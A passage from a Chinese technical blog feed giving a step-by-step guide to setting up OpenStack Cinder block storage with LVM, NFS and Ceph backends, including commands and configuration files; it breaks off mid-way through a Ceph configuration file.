    <category term="WEB" scheme="https://blog.boychai.xyz/tags/WEB/"/>
    
    <category term="CRYPTO" scheme="https://blog.boychai.xyz/tags/CRYPTO/"/>
    
    <category term="MISC" scheme="https://blog.boychai.xyz/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack-Cinder块存储-对接LVM、NFS、CEPH</title>
    <link href="https://blog.boychai.xyz/2025/01/11/OpenStack-Cinder%E5%9D%97%E5%AD%98%E5%82%A8-%E5%AF%B9%E6%8E%A5LVM%E3%80%81NFS%E3%80%81CEPH/"/>
    <id>https://blog.boychai.xyz/2025/01/11/OpenStack-Cinder%E5%9D%97%E5%AD%98%E5%82%A8-%E5%AF%B9%E6%8E%A5LVM%E3%80%81NFS%E3%80%81CEPH/</id>
    <published>2025-01-11T16:05:00.000Z</published>
    <updated>2025-07-17T05:40:18.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考文档：<a href="https://docs.openstack.org/cinder/stein/install/">https://docs.openstack.org/cinder/stein/install/</a><br>块存储通过cinder组件对接，他也分为控制节点和计算节点的区分。</p><h1 id="控制节点"><a href="#控制节点" class="headerlink" title="控制节点"></a>控制节点</h1><p>参考文档： <a href="https://docs.openstack.org/cinder/stein/install/cinder-controller-install-rdo.html">https://docs.openstack.org/cinder/stein/install/cinder-controller-install-rdo.html</a><br>先去创库授权，在控制节点执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">CREATE DATABASE cinder;</span><br><span class="line">GRANT ALL PRIVILEGES ON cinder.* TO <span class="string">&#x27;cinder&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;CINDER_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON cinder.* TO <span class="string">&#x27;cinder&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;CINDER_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在认证组件中创建用户、授权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./admin-openrc</span><br><span class="line">openstack user create --domain default --password CINDER_PASS cinder</span><br><span class="line">openstack role add --project service --user cinder admin</span><br></pre></td></tr></table></figure><p>创建服务实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openstack service create --name cinderv2 \</span><br><span class="line">  --description <span class="string">&quot;OpenStack Block Storage&quot;</span> volumev2</span><br><span class="line">openstack service create --name cinderv3 \</span><br><span class="line">  --description <span class="string">&quot;OpenStack Block Storage&quot;</span> volumev3</span><br></pre></td></tr></table></figure><p>创建api访问入口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev2 public http://controller:8776/v2/%\(project_id\)s</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev2 internal http://controller:8776/v2/%\(project_id\)s</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev2 admin http://controller:8776/v2/%\(project_id\)s</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev3 public http://controller:8776/v3/%\(project_id\)s</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev3 internal http://controller:8776/v3/%\(project_id\)s</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  volumev3 admin http://controller:8776/v3/%\(project_id\)s</span><br></pre></td></tr></table></figure><p>安装软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-cinder</span><br></pre></td></tr></table></figure><p>备份配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/cinder/cinder.conf&#123;,.bak&#125;</span><br><span class="line">egrep -v <span class="string">&quot;^#|^$&quot;</span> /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf </span><br></pre></td></tr></table></figure><p>修改<code>/etc/cinder/cinder.conf </code>文件，主要是以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">my_ip = 10.0.0.11</span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">[database]</span><br><span class="line">connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder</span><br><span class="line">[keystone_authtoken]</span><br><span class="line">www_authenticate_uri = http://controller:5000</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">project_name = service</span><br><span class="line">username = cinder</span><br><span class="line">password = CINDER_PASS</span><br><span class="line">[oslo_concurrency]</span><br><span class="line">lock_path = /var/lib/cinder/tmp</span><br></pre></td></tr></table></figure><p>以cinder的身份填充数据库，这一步会有一个弃用信息，不用管。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">&quot;cinder-manage db sync&quot;</span> cinder</span><br></pre></td></tr></table></figure><p>对接控制节点的计算服务,编辑nova的配置<code>/etc/nova/nova.conf</code>,主要是下面内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[cinder]</span><br><span class="line">os_region_name = RegionOne</span><br></pre></td></tr></table></figure><p>重启nova组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart openstack-nova-api.service</span><br></pre></td></tr></table></figure><p>启动cinder组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now openstack-cinder-api.service openstack-cinder-scheduler.service</span><br></pre></td></tr></table></figure><p>验证可以参考链接： <a href="https://docs.openstack.org/cinder/stein/install/cinder-verify.html">https://docs.openstack.org/cinder/stein/install/cinder-verify.html</a></p><h1 id="存储节点"><a href="#存储节点" class="headerlink" title="存储节点"></a>存储节点</h1><p>参考文档： <a href="https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html">https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html</a><br>官方推荐使用lvm+块存储的方式来做openstack的存储<br>这里在计算节点compute1安装第一个存储节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y lvm2 device-mapper-persistent-data</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now lvm2-lvmetad.service</span><br></pre></td></tr></table></figure><p>现在给这个节点添加一个硬盘<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105204918.png"><br>使用下面命令让主机热加载硬盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;- - -&#x27;</span> &gt;/sys/class/scsi_host/host0/scan </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;- - -&#x27;</span> &gt;/sys/class/scsi_host/host1/scan </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;- - -&#x27;</span> &gt;/sys/class/scsi_host/host2/scan </span><br></pre></td></tr></table></figure><p>开始创建存储卷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pvcreate /dev/sdb</span><br><span class="line">vgcreate cinder-volumes /dev/sdb</span><br></pre></td></tr></table></figure><p>编辑lvm的配置文件<code>/etc/lvm/lvm.conf</code>然后参考文档： <a href="https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html#prerequisites">https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html#prerequisites</a><br>说是建议不让lvm去扫描咱们使用的这个卷，如果不加可能会导致后期出现各种问题，还有就是如果系统本身也是lvm也需要加上，我这里系统用的就是lvm的方式所以修改的内容是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter = [ <span class="string">&quot;a/sda/&quot;</span>, <span class="string">&quot;a/sdb/&quot;</span>, <span class="string">&quot;r/.*/&quot;</span>]</span><br></pre></td></tr></table></figure><p>他还提醒其他计算节点如果采用的也是lvm也要过滤掉sda，如果是请跟随设置。<br>安装软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-cinder targetcli python-keystone</span><br></pre></td></tr></table></figure><p>备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/cinder/cinder.conf&#123;,.bak&#125;</span><br><span class="line">egrep -v <span class="string">&quot;^#|^$&quot;</span> /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf</span><br></pre></td></tr></table></figure><p>修改配置文件<code>/etc/cinder/cinder.conf</code>，主要是下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">enabled_backends = lvm</span><br><span class="line">glance_api_servers = http://controller:9292</span><br><span class="line"># 当前ip</span><br><span class="line">my_ip = 10.0.0.31</span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">[database]</span><br><span class="line">connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder</span><br><span class="line">[keystone_authtoken]</span><br><span class="line">www_authenticate_uri = http://controller:5000</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">project_name = service</span><br><span class="line">username = cinder</span><br><span class="line">password = CINDER_PASS</span><br><span class="line">[oslo_concurrency]</span><br><span class="line">lock_path = /var/lib/cinder/tmp</span><br><span class="line">[lvm]</span><br><span class="line">volume_driver = cinder.volume.drivers.lvm.LVMVolumeDriver</span><br><span class="line">volume_group = cinder-volumes</span><br><span class="line">target_protocol = iscsi</span><br><span class="line">target_helper = lioadm</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now openstack-cinder-volume.service target.service</span><br></pre></td></tr></table></figure><p>验证参考链接： <a href="https://docs.openstack.org/cinder/stein/install/cinder-verify.html">https://docs.openstack.org/cinder/stein/install/cinder-verify.html</a><br>此时打开仪表盘会发现项目中多出了一个卷<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105212115.png"></p><h1 id="其他存储"><a href="#其他存储" class="headerlink" title="其他存储"></a>其他存储</h1><p>上面对接的是lvm的，下面开始对接nfs和ceph的</p><h2 id="对接NFS"><a href="#对接NFS" class="headerlink" title="对接NFS"></a>对接NFS</h2><p>具体可以参考： </p><ul><li><a href="https://docs.openstack.org/cinder/stein/drivers.html#nfsdriver">https://docs.openstack.org/cinder/stein/drivers.html#nfsdriver</a></li><li><a href="https://www.cnblogs.com/jiawei2527/p/14028185.html">https://www.cnblogs.com/jiawei2527/p/14028185.html</a></li></ul><p>这里在compute1、2上对接NFS，然后NFS是跑在2上的，为什么要在两台主机上配置呢？是因为一个cinder的存储节点可以对接多种存储，这里为了做演示都展示一下。<br>这里先配置一下NFS，在compute2上，具体操作如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install nfs-utils</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/exports</code>配置文件，写入以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/data 10.0.0.0/24(rw,async,no_root_squash,no_all_squash)</span><br><span class="line">/data2 10.0.0.0/24(rw,async,no_root_squash,no_all_squash)</span><br></pre></td></tr></table></figure><p>创建目录以及启动并加载配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@compute2 ~]# <span class="built_in">mkdir</span> /data</span><br><span class="line">[root@compute2 ~]# <span class="built_in">mkdir</span> /data2</span><br><span class="line">[root@compute2 ~]# systemctl <span class="built_in">enable</span> rpcbind</span><br><span class="line">[root@compute2 ~]# systemctl <span class="built_in">enable</span> nfs</span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/nfs-server.service to /usr/lib/systemd/system/nfs-server.service.</span><br><span class="line">[root@compute2 ~]# systemctl start rpcbind</span><br><span class="line">[root@compute2 ~]# systemctl start nfs</span><br></pre></td></tr></table></figure><p>在compute1中执行命令<code>showmount -e 10.0.0.32</code>验证nfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# showmount -e 10.0.0.32</span><br><span class="line">Export list <span class="keyword">for</span> 10.0.0.32:</span><br><span class="line">/data2 10.0.0.0/24</span><br><span class="line">/data  10.0.0.0/24</span><br></pre></td></tr></table></figure><p>在compute1的cinder上对接NFS存储，编辑配置文件<code>/etc/cinder/cinder.conf</code>，主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">...</span><br><span class="line">enabled_backends = lvm,nfs</span><br><span class="line">...</span><br><span class="line">[lvm]</span><br><span class="line">...</span><br><span class="line">volume_backend_name = lvm</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[nfs]</span><br><span class="line">volume_driver = cinder.volume.drivers.nfs.NfsDriver</span><br><span class="line">nfs_shares_config = /etc/cinder/nfs_shares</span><br><span class="line">volume_backend_name = nfs1</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/cinder/nfs_shares</code>写入下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.32:/data</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart openstack-cinder-volume.service</span><br></pre></td></tr></table></figure><p>现在再去compute2去创建第二个存储节点，并且对接NFS<br>参考文档： <a href="https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html">https://docs.openstack.org/cinder/stein/install/cinder-storage-install-rdo.html</a><br>安装软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y device-mapper-persistent-data openstack-cinder targetcli python-keystone</span><br></pre></td></tr></table></figure><p>备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/cinder/cinder.conf&#123;,.bak&#125;</span><br><span class="line">egrep -v <span class="string">&quot;^#|^$&quot;</span> /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/cinder/cinder.conf</code>，主要内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">glance_api_servers = http://controller:9292</span><br><span class="line">enabled_backends  = nfs</span><br><span class="line">my_ip = 10.0.0.32</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line">[database]</span><br><span class="line">connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder</span><br><span class="line">[keystone_authtoken]</span><br><span class="line">www_authenticate_uri = http://controller:5000</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">project_name = service</span><br><span class="line">username = cinder</span><br><span class="line">password = CINDER_PASS</span><br><span class="line">[oslo_concurrency]</span><br><span class="line">lock_path = /var/lib/cinder/tmp</span><br><span class="line">[nfs]</span><br><span class="line">volume_driver = cinder.volume.drivers.nfs.NfsDriver</span><br><span class="line">nfs_shares_config = /etc/cinder/nfs_shares</span><br><span class="line">volume_backend_name = nfs2</span><br></pre></td></tr></table></figure><p>编辑NFS连接文件<code>/etc/cinder/nfs_shares</code>,主要内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.32:/data2</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now openstack-cinder-volume.service target.service</span><br></pre></td></tr></table></figure><p>这里算是配置了三个存储，一个是compute1上的lvm，nfs1，然后compute2上的一个nfs2，它们三个在openstack也可以做到区分，也建议做区分的使用，打开仪表盘的<code>管理员-》卷-》卷类型</code>中创建三个卷类型<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105223017.png"><br>挨个更新它们的元数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105223116.png"><br>下面是nfs2的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105223141.png"><br>其他三个同理，这里就是给对接的卷做分类，通过配置的<code>volume_backend_name</code>选项做分类，三个都做好之后去<code>计算-》卷-》卷</code>中创建卷，此时就可以选择卷类型<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105223348.png"><br>我这里挨个创建5G大小的卷，然后去对应提供存储的主机中查看卷情况<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105223903.png"><br>全部可用，去主机中查看<br>compute1主机的lvm<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105223606.png"><br>compute2主机的nfs1和nfs2<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105223638.png"></p><h2 id="对接Ceph"><a href="#对接Ceph" class="headerlink" title="对接Ceph"></a>对接Ceph</h2><p>我的Ceph机器的ip对应表如下,网络是互通的</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 网络配置</span><br><span class="line">主机名          NAT网络         </span><br><span class="line">node1       10.0.0.150/24</span><br><span class="line">node2       10.0.0.151/24</span><br><span class="line">node3       10.0.0.152/24</span><br></pre></td></tr></table></figure><p>我ceph的版本是reef，比较新，我这里因为环境问题，操作风险较大，对接的时候建议是采用对应版本的软件，我这里是使用ceph的<code>nautilus</code>版本的客户端去对接<code>reef</code>的Ceph集群，在每一台compute主机上安装ceph工具，S版本集群默认自带的最高就是<code>nautilus</code>版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install ceph-common</span><br></pre></td></tr></table></figure><p>之后在ceph的管理节点上创建一个位置用来存放cinder的数据,具体含义可以参考Ceph的文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ceph osd pool create volumes 128</span><br></pre></td></tr></table></figure><p>之后再创建一个访问凭证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ceph auth get-or-create client.cinder mon <span class="string">&#x27;allow r&#x27;</span> osd <span class="string">&#x27;allow class-read object_prefix rbd_children, allow rwx pool=volumes,allow rwx pool=vms, allow rx pool=images&#x27;</span></span><br></pre></td></tr></table></figure><p>执行返回结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[client.cinder]</span><br><span class="line">        key = AQBAE4Jnr2FADxAA+5RG4nU8mOzkL3eHVzcdug==</span><br></pre></td></tr></table></figure><p>需要把这个内容复制到所有openstack节点的<code>/etc/ceph/ceph.client.cinder.keyring</code>位置，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; /etc/ceph/ceph.client.cinder.keyring &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[client.cinder]</span></span><br><span class="line"><span class="string">        key = AQBAE4Jnr2FADxAA+5RG4nU8mOzkL3eHVzcdug==</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="comment"># 给权限,两种命令都可以,第一条是需要在cinder组件装好才能用</span></span><br><span class="line"><span class="built_in">chown</span> cinder:cinder /etc/ceph/ceph.client.cinder.keyring</span><br><span class="line"><span class="built_in">chmod</span> +r /etc/ceph/ceph.client.cinder.keyring</span><br></pre></td></tr></table></figure><p>在所有的compute主机中中配置secret，执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成一个uuid</span></span><br><span class="line">uuidgen</span><br><span class="line"><span class="comment"># 我这里返回的是 ed4a34e1-590e-4cce-b35a-286a48d7b040 ,注意所有主机都必须是这个uuid</span></span><br><span class="line"><span class="built_in">cat</span> &gt; secret.xml &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&lt;secret ephemeral=&#x27;no&#x27; private=&#x27;no&#x27;&gt;</span></span><br><span class="line"><span class="string">  &lt;uuid&gt;ed4a34e1-590e-4cce-b35a-286a48d7b040&lt;/uuid&gt;</span></span><br><span class="line"><span class="string">  &lt;usage type=&#x27;ceph&#x27;&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;client.cinder secret&lt;/name&gt;</span></span><br><span class="line"><span class="string">  &lt;/usage&gt;</span></span><br><span class="line"><span class="string">&lt;/secret&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p>然后定义密钥文件和设置ceph的凭证，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">virsh secret-define --file secret.xml</span><br><span class="line"><span class="built_in">cat</span> /etc/ceph/ceph.client.cinder.keyring|grep key|awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> &gt; ./client.cinder.key</span><br><span class="line">virsh secret-set-value --secret ed4a34e1-590e-4cce-b35a-286a48d7b040 --<span class="built_in">base64</span> $(<span class="built_in">cat</span> ./client.cinder.key)</span><br></pre></td></tr></table></figure><p>之后在compute3把Ceph的<code>/etc/ceph/ceph.conf</code>文件拿过来，我这里的的内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">        fsid = 81ecd502-cf4e-11ef-baaf-000c297bc826</span><br><span class="line">        mon_host = [v2:10.0.0.150:3300/0,v1:10.0.0.150:6789/0] [v2:10.0.0.151:3300/0,v1:10.0.0.151:6789/0] [v2:10.0.0.152:3300/0,v1:10.0.0.152:6789/0]</span><br></pre></td></tr></table></figure><p>它记录着一些连接地址什么的，需要把这个文件放到对接ceph的cinder的<code>/etc/ceph/ceph.conf</code>中，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/ceph/ceph.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[global]</span></span><br><span class="line"><span class="string">        fsid = 81ecd502-cf4e-11ef-baaf-000c297bc826</span></span><br><span class="line"><span class="string">        mon_host = [v2:10.0.0.150:3300/0,v1:10.0.0.150:6789/0] [v2:10.0.0.151:3300/0,v1:10.0.0.151:6789/0] [v2:10.0.0.152:3300/0,v1:10.0.0.152:6789/0]</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p>在compute3中安装cinder</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-cinder targetcli python-keystone</span><br></pre></td></tr></table></figure><p>备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/cinder/cinder.conf&#123;,.bak&#125;</span><br><span class="line">egrep -v <span class="string">&quot;^#|^$&quot;</span> /etc/cinder/cinder.conf.bak &gt; /etc/cinder/cinder.conf</span><br></pre></td></tr></table></figure><p>修改配置文件<code>/etc/cinder/cinder.conf</code>，主要是下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">glance_api_servers = http://controller:9292</span><br><span class="line">my_ip = 10.0.0.33 </span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">enabled_backends = ceph</span><br><span class="line">[database]</span><br><span class="line">connection = mysql+pymysql://cinder:CINDER_DBPASS@controller/cinder</span><br><span class="line">[keystone_authtoken]</span><br><span 